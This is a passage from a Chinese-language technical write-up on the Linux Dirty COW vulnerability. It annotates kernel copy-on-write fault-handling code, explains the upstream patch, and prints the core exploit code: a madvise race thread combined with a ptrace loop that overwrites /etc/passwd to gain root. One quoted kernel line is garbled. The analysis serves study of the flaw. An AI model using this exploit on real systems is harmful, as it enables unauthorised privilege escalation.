            lru_cache_add_active_or_unevictable(page, vma);///更新lru缓存
        } else {
            inc_mm_counter_fast(vma->vm_mm, mm_counter_file(page));
            page_add_file_rmap(page, false);
        }
        set_pte_at(vma->vm_mm, fe->address, fe->pte, entry);//设置页表项
        /* no need to invalidate: a not-present page won't be cached */
        update_mmu_cache(vma, fe->address, fe->pte);
        return 0;
    }
    //
    /*
     * Do pte_mkwrite, but only if the vma says VM_WRITE.  We do this when
     * servicing faults for write access.  In the normal case, do always want
     * pte_mkwrite.  But get_user_pages can cause write faults for mappings
     * that do not have writing enabled, when used by access_process_vm.
     */
    static inline pte_t maybe_mkwrite(pte_t pte, struct vm_area_struct *vma)
    {
        if (likely(vma->vm_flags & VM_WRITE))
            pte = pte_mkwrite(pte);/*VMA的vm_flags属性不具有可写属性，因此这里不会设置pte_entry为可写，只是设置为可读和dirty*/
        return pte;
    }
    static inline pte_t pte_mkwrite(pte_t pte)
    {
        return set_pte_bit(pte, __pgprot(PTE_WRITE));
    }
    //上面这些调用跟进就是第一次缺页处理的调用过程，最终建立了一个新的pte表项，且其属性为只读/dirty/present
    //之后回到retry,下面是第二次缺页的处理
    //写时复制的处理函数
    /*
     * This routine handles present pages, when users try to write
     * to a shared page. It is done by copying the page to a new address
     * and decrementing the shared-page counter for the old page.
     *
     * Note that this routine assumes that the protection checks have been
     * done by the caller (the low-level page fault routine in most cases).
     * Thus we can safely just mark it writable once we've done any necessary
     * COW.
     *
     * We also mark the page dirty at this point even though the page will
     * change only once the write actually happens. This avoids a few races,
     * and potentially makes it more efficient.
     *
     * We enter with non-exclusive mmap_sem (to exclude vma changes,
     * but allow concurrent faults), with pte both mapped and locked.
     * We return with mmap_sem still held, but pte unmapped and unlocked.
     */
    static int do_wp_page(struct fault_env *fe, pte_t orig_pte)
        __releases(fe->ptl)
    {
        struct vm_area_struct *vma = fe->vma;
        struct page *old_page;
        old_page = vm_normal_page(vma, fe->address, orig_pte);//得到旧的页描述符
        if (!old_page) {
            /*
             * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a
             * VM_PFNMAP VMA.
             *
             * We should not cow pages in a shared writeable mapping.
             * Just mark the pages writable and/or call ops->pfn_mkwrite.
             */
                    if ((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
                         (VM_WRITE|VM_SHARED))
                return wp_pfn_shared(fe, orig_pte);//VM_SHARE
                    //使用PFN的特殊映射
            pte_unmap_unlock(fe->pte, fe->ptl);
            return wp_page_copy(fe, orig_pte, old_page);
        }
        /*
         * Take out anonymous pages first, anonymous shared vmas are
         * not dirty accountable.
         */
        if (PageAnon(old_page) && !PageKsm(old_page)) {/*PageAnon表示已经COW过了，如果只有自己一个进程使用这个页那么可以直接使用它而不必COW*/
            int total_mapcount;
            if (!trylock_page(old_page)) {//对这个页加锁
                get_page(old_page);
                pte_unmap_unlock(fe->pte, fe->ptl);
                lock_page(old_page);
                fe->pte = pte_offset_map_lock(vma->vm_mm, fe->pmd,
                        fe->address, &fe->ptl);
                if (!pte_same(*fe->pte, orig_pte)) {
                                    unlock_page(old_page);
                    pte_unmap_unlock(fe->pte, fe->ptl);
                    put_page(old_page);
                    return 0;
                }
                put_page(old_page);
            }
            if (reuse_swap_page(old_page, &total_mapcount)) {
                if (total_mapcount == 1) {//map_count为0，表示只有自己这个进程在用页，调wp_page_reuse复用
                    /*
                     * The page is all ours. Move it to
                     * our anon_vma so the rmap code will
                     * not search our parent or siblings.
                     * Protected against the rmap code by
                     * the page lock.
                     */
                    page_move_anon_rmap(old_page, vma);
                }
                unlock_page(old_page);
                return wp_page_reuse(fe, orig_pte, old_page, 0, 0);
            }
            unlock_page(old_page);
        } else if (unlikely((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
                        (VM_WRITE|VM_SHARED))) {
            return wp_page_shared(fe, orig_pte, old_page);
        }
    /*
         * Ok, we need to copy. Oh, well..
         */
        get_page(old_page);
        pte_unmap_unlock(fe->pte, fe->ptl);
        return wp_page_copy(fe, orig_pte, old_page);
    }
    //处理在当前虚拟内存区可以复用的write页中断
    /*
     * Handle write page faults for pages that can be reused in the current vma
     *
     * This can happen either due to the mapping being with the VM_SHARED flag,
     * or due to us being the last reference standing to the page. In either
     * case, all we need to do here is to mark the page as writable and update
     * any related book-keeping.
     */
    static inline int wp_page_reuse(struct fault_env *fe, pte_t orig_pte,
                struct page *page, int page_mkwrite, int dirty_shared)
        __releases(fe->ptl)
    {
        struct vm_area_struct *vma = fe->vma;
        pte_t entry;
        /*
         * Clear the pages cpupid information as the existing
         * information potentially belongs to a now completely
         * unrelated process.
         */
        if (page)
            page_cpupid_xchg_last(page, (1 address, pte_pfn(orig_pte));
        entry = pte_mkyoung(orig_pte);
        entry = maybe_mkwrite(pte_mkdirty(entry), vma);
        if (ptep_set_access_flags(vma, fe->address, fe->pte, entry, 1))
            update_mmu_cache(vma, fe->address, fe->pte);
        pte_unmap_unlock(fe->pte, fe->ptl);
        if (dirty_shared) {
            struct address_space *mapping;
            int dirtied;
            if (!page_mkwrite)
                lock_page(page);
            dirtied = set_page_dirty(page);
            VM_BUG_ON_PAGE(PageAnon(page), page);
            mapping = page->mapping;
            unlock_page(page);
            put_page(page);
            if ((dirtied || page_mkwrite) && mapping) {
                /*
                 * Some device drivers do not set page.mapping
                 * but still dirty their pages
                 */
                balance_dirty_pages_ratelimited(mapping);
            }
            if (!page_mkwrite)
                file_update_time(vma->vm_file);
        }
        return VM_FAULT_WRITE;//这个标志表示COW已经完成，可以break出来
    }
    /*break完了之后我们调用madvise让页表项清空，也就是COW的页已经无法寻找到了，在这之后会有第三次的缺页调用，查看pte发现失败，再进行第四次的缺页处理
    do_fault:
    if (!(fe->flags & FAULT_FLAG_WRITE))
            return do_read_fault(fe, pgoff);//如果需要获取的页面不具备可写属性则调用do_read_fault，因为我们已经把要请求的WRITE标志清空了，这里就会把它当成只读请求去满足
    */
    static int do_read_fault(struct fault_env *fe, pgoff_t pgoff)
    {
        struct vm_area_struct *vma = fe->vma;
        struct page *fault_page;
        int ret = 0;
        /*
         * Let's call ->map_pages() first and use ->fault() as fallback
         * if page by the offset is not ready to be mapped (cold cache or
         * something).
         */
        if (vma->vm_ops->map_pages && fault_around_bytes >> PAGE_SHIFT > 1) {
            ret = do_fault_around(fe, pgoff);
            if (ret)
                return ret;
        }
        ret = __do_fault(fe, pgoff, NULL, &fault_page, NULL);//调用这里，第三个参数为NULL
        if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
            return ret;
        ret |= alloc_set_pte(fe, NULL, fault_page);
        if (fe->pte)
            pte_unmap_unlock(fe->pte, fe->ptl);
        unlock_page(fault_page);
        if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
            put_page(fault_page);
        return ret;
    }
    //cow_page为NULL表示不是COW
    /*
     * The mmap_sem must have been held on entry, and may have been
     * released depending on flags and vma->vm_ops->fault() return value.
     * See filemap_fault() and __lock_page_retry().
     */
    static int __do_fault(struct fault_env *fe, pgoff_t pgoff,
            struct page *cow_page, struct page **page, void **entry)
    {
        struct vm_area_struct *vma = fe->vma;
        struct vm_fault vmf;
        int ret;
        vmf.virtual_address = (void __user *)(fe->address & PAGE_MASK);
        vmf.pgoff = pgoff;
        vmf.flags = fe->flags;
        vmf.page = NULL;
        vmf.gfp_mask = __get_fault_gfp_mask(vma);
        vmf.cow_page = cow_page;
        ret = vma->vm_ops->fault(vma, &vmf);/*使用vma->vm_ops->fault将文件内容读取到fault_page页面，如果newpage不为空再拷贝到newpage*/
        if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
            return ret;
        if (ret & VM_FAULT_DAX_LOCKED) {
            *entry = vmf.entry;
            return ret;
        }
            if (unlikely(PageHWPoison(vmf.page))) {
            if (ret & VM_FAULT_LOCKED)
                unlock_page(vmf.page);
            put_page(vmf.page);
            return VM_FAULT_HWPOISON;
        }
        if (unlikely(!(ret & VM_FAULT_LOCKED)))
            lock_page(vmf.page);
        else
            VM_BUG_ON_PAGE(!PageLocked(vmf.page), vmf.page);
        *page = vmf.page;
        return ret;
    }
    //至此，我们从fault_page中得到了本进程的只读页并可成功对其写入
## exp分析
exp的核心部分很短，前面是备份`/etc/passwd`和生成新root密码的操作，f为文件指针，用mmap映射出一块`MAP_PRIVATE`的内存，fork起一个子进程，在父进程中使用ptrace(`PTRACE_POKETEXT`标志的作用是把complete_passwd_line拷贝到map指向的内存空间)不断去修改这块只读内存。在子进程中起线程循环调用`madviseThread`子线程来解除内存映射和页表映射。
最终在某一时刻，即第二次缺页异常处理完成时madvise调用，我们写入原文件映射的页框而非COW的页从而成功修改了`/etc/passwd`的内存并在页框更新到磁盘文件时候成功修改密码文件。
    void *madviseThread(void *arg) {
      int i, c = 0;
      for(i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
      }
      printf("madvise %d\n\n", c);
    }
    ...
    map = mmap(NULL,
                 st.st_size + sizeof(long),
                 PROT_READ,
                 MAP_PRIVATE,
                 f,
                 0);
      printf("mmap: %lx\n",(unsigned long)map);
      pid = fork();
      if(pid) {
        waitpid(pid, NULL, 0);
        int u, i, o, c = 0;
        int l=strlen(complete_passwd_line);
        for(i = 0; i < 10000/l; i++) {
          for(o = 0; o < l; o++) {
            for(u = 0; u < 10000; u++) {
              c += ptrace(PTRACE_POKETEXT,
                          pid,
                          map + o,
                          *((long*)(complete_passwd_line + o)));
            }
          }
        }
        printf("ptrace %d\n",c);
      }
      else {
        pthread_create(&pth,
                       NULL,
                       madviseThread,
                       NULL);
        ptrace(PTRACE_TRACEME);
        kill(getpid(), SIGSTOP);
        pthread_join(pth,NULL);
      }
## patch
patch的链接如下[git-kernel](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619)，增加了一个新的标志位`FOLL_COW`，在`faultin_page`函数中获取到一个CoWed
page之后我们不会去掉`FOLL_WRITE`而是增加`FOLL_COW`标志表示获取`FOLL_COW`的页。即使危险线程解除了页表映射，我们也不会因为没有`FOLL_WRITE`而直接返回原页框，而是按照CoW重新分配CoW的页框。
然而这个patch打的并不到位，在`透明巨大页内存管理(THP)`的处理方面仍存在缺陷，在一年后爆出了新的漏洞，也就是`Huge
DirtyCow(CVE-2017–1000405)`。
## 总结
个人感觉Dirty
Cow漏洞对新手来说是比较友好的，不像bpf/ebpf这种要看很久源码的。exp比较短，网上资料比较多，耐心分析几天总能理清漏洞利用逻辑。
## 参考
文章的漏洞逻辑概述部分引用了`atum`大佬的文章，非常感谢`atum`师傅的分析。
[atum关于dirty cow的分析](https://www.anquanke.com/post/id/84784)
《深入理解Linux内核》(第二章/第九章)
《奔跑吧Linux内核-内存管理DirtyCow》
Linux-kernel-4.4.0-31-generic source code